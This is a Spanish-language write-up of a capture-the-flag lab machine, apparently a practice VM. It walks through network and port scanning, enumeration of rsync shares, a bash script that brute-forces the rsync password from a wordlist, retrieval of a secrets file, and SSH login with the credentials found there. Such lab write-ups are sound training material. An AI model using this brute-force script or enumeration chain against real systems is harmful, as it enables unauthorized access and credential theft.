------------------

Iniciamos con un escaneo en red, esto con ayuda de [[Arp-Scan]]:

```bash
arp-scan -I ens33 --localnet --ignoredups
```

![[Pasted image 20260216212321.png]]

Observamos la IP de la maquina victima, la cual es `192.168.1.71`.

Intentemos mediante el comando `ping` intuir de cierta forma el sistema operativo:

```bash
ping -c 1 192.168.1.71
```

![[Pasted image 20260216212555.png]]

Identificamos que tenemos un `ttl=64`, mediante el cual suponemos un sistema operativo de tipo Linux.

Ya podemos comenzar con un escaneo de puertos general, para observar primero puertos abiertos con ayuda de [[Nmap]]:

```bash
nmap -p- --open -sS --min-rate 5000 -n -v -Pn 192.168.1.71 -oG allPorts
```

![[Pasted image 20260217215031.png]]

Observamos los puertos `22,80,873` abiertos. Intentemos obtener mas información sobre los puertos abiertos, esto, nuevamente con [[Nmap]]:

```bash
nmap -p22,80,873 -sVC 192.168.1.71 -oN target
```

![[Pasted image 20260217215400.png]]

Tenemos los servicios: SSH puerto `22`, http puerto `80` y rsync puerto `873` corriendo en la máquina victima.

Comencemos revisando la web alojada en el puerto `80`

![[Pasted image 20260217215903.png]]

Tenemos un texto el cual nos explica el origen de la palabra `sabulaji` y como esta es usada, a parte de eso no vamos a ver nada mas.

Se realizo fuzzing mediante herramienta como [[Gobuster]] y [[FFUF]] pero no logramos encontrar nada nuevo.

Al no encontrar nada comenzamos a enumerar el servicio de `rsync` recalcando que este servicio es usado especialmente para sincronizar archivos y directorios en de forma local o remota, en este caso es de forma remota y veamos que recursos tenemos:

```bash
rsync --list-only 192.168.1.71::
```

![[Pasted image 20260217221059.png]]

Observamos lo que al parecer son dos directorios, veamos primero el contenido de `public`:

```bash
rsync -av rsync://192.168.1.71/public
```

![[Pasted image 20260217221409.png]]

bajemos el archivo a local para observar su contenido:

```bash
rsync -avz rsync://192.168.1.71/public/todo.list .
```

![[Pasted image 20260217222130.png]]

El contenido de `todo.list` es:

![[Pasted image 20260217222159.png]]

Tenemos una lista de tareas, exclusivamente tenemos tareas pertenecientes a `sabulaji` podemos intentar usarlo como usuario si es necesario.

Bueno vamos ahora a intentar listar lo perteneciente a `epages`:

```bash
rsync --list-only rsync://192.168.1.71/epages
```

![[Pasted image 20260217222411.png]]

Necesitamos de una contraseña pero quiero creer que la misma orientada a un usuario, recordando el usuario `sabulaji` intentemos algunas por defecto de la siguiente manera:

```bash
rsync --list-only rsync://sabulaji@192.168.1.71/epages
```

![[Pasted image 20260217222540.png]]

No se logro con contraseñas por defecto por lo que el siguiente paso será automatizar un script que nos permita realizar fuerza bruta y el script me quedo de la siguiente manera:

```bash
#!/bin/bash

function ctrl_c() {
  echo -e "\n\n[!] Saliendo....\n\n"
  exit 1
  tput cnorm
}

trap ctrl_c SIGINT

clear

echo -e "\n=========== Information ============\n"

echo -n "IP: " && read ip
echo -n "Port: " && read port
echo -n "file or folder name: " && read file
echo -n "Dictionary: " && read dic_file
echo -n "User: " && read user

echo -e "\n===================================="

tput civis

declare -a dictionary=($(cat $dic_file | xargs))

echo -e "\n========== Result ==============\n"

for password in ${dictionary[@]}; do
  (echo "${password}" | rsync --password-file=- rsync://${user}@${ip}/${file}) &>/dev/null && echo -e "[+] Password -> ${password}" && break
done

tput cnorm

echo -e "\n================================\n"

```

![[Pasted image 20260219213826.png]]

Observamos que la contraseña es `admin123`, con esto vamos a intentar ver el contenido de `epages`:

```bash
rsync -av rsync://sabulaji@192.168.1.71:873/epages
```

![[Pasted image 20260219214241.png]]

Como logramos observar tenemos el archivo `secrets.doc` un documento el cual vamos a traerlo a local para ver su contenido:

```bash
rsync -avz rsync://sabulaji@192.168.1.71:873/epages/secrets.doc .
```

![[Pasted image 20260219215954.png]]

Ya con el archivo en local procedemos a verlo en cualquier lector de documentos en mi caso con onlyOffice:

![[Pasted image 20260219220346.png]]

Tenemos un texto algo extenso pero en este se describe una cuenta por defecto `welcome` donde se usa una contraseña que es `P@ssw0rd123!`, con estas credenciales vamos directamente a intentar conectarnos mediante `ssh`:

```bash
ssh welcome@192.168.1.71
```

![[Pasted image 20260219221330.png]]

![[Pasted image 20260219221600.png]]

Como observamos dentro del directorio personal de `welcome` vamos a lograr encontrar la flag de usuario.

